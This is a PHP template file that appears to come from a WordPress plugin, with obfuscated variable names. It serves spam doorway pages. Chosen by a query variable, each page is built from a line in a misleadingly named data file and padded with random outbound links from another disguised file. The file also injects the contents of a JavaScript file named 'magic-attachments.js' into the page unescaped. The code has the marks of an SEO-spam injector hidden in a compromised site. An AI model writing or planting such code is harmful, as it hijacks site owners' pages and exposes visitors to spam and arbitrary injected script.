<?php
$ce4ZLJ9E = intval(get_query_var('ksihnvti'));

if ($ce4ZLJ9E < 1 || $ce4ZLJ9E > 4989) return;
$kHGf1wG = file(plugin_dir_path(__FILE__).'project-ai.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$u3DqUshOIQ = explode(';', $kHGf1wG[$ce4ZLJ9E]);
if (count($u3DqUshOIQ) < 2) return;
$kn6CsK = $u3DqUshOIQ[0];
$hQ34MHgEU  = $u3DqUshOIQ[1];
$eOOcwc = $u3DqUshOIQ[2];
$m1DMQDQk  = $u3DqUshOIQ[3];
$mdaGerLF = $u3DqUshOIQ[4];
set_query_var('mcnil', $kn6CsK);

$m2j15J7HDg = '';
$qhb2JYi2YT = plugin_dir_path(__FILE__).'connect-schema.php';
if (is_file($qhb2JYi2YT)) {
	$cjHiuLkO6t = file($qhb2JYi2YT, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($cjHiuLkO6t);
	shuffle($cjHiuLkO6t);
	$unKcYn = mt_rand(2, 5);
	if (count($cjHiuLkO6t) > $unKcYn) {
		for ($y0o1M = 0; $y0o1M < $unKcYn; $y0o1M++) {
			$yfsuX = array_shift($cjHiuLkO6t);
			$m2j15J7HDg .= '<p><a href="'.$yfsuX.'">'.$yfsuX.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $kn6CsK; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $hQ34MHgEU . "</p>\n";
				if (strlen($m1DMQDQk) > 0) echo "<p>" . $m1DMQDQk . "</p>\n";
				if (strlen($eOOcwc) > 0) echo "<p>" . $eOOcwc . "</p>\n";
				if (strlen($mdaGerLF) > 0) echo '<p><a href="#"><img src="'.$mdaGerLF.'"></a>' . "</p>\n";
				echo $m2j15J7HDg;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ySsv8chJ = plugin_dir_path(__FILE__) . 'magic-attachments.js';
if (is_file($ySsv8chJ)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ySsv8chJ);
	echo '</script>';
}
get_footer();
?>
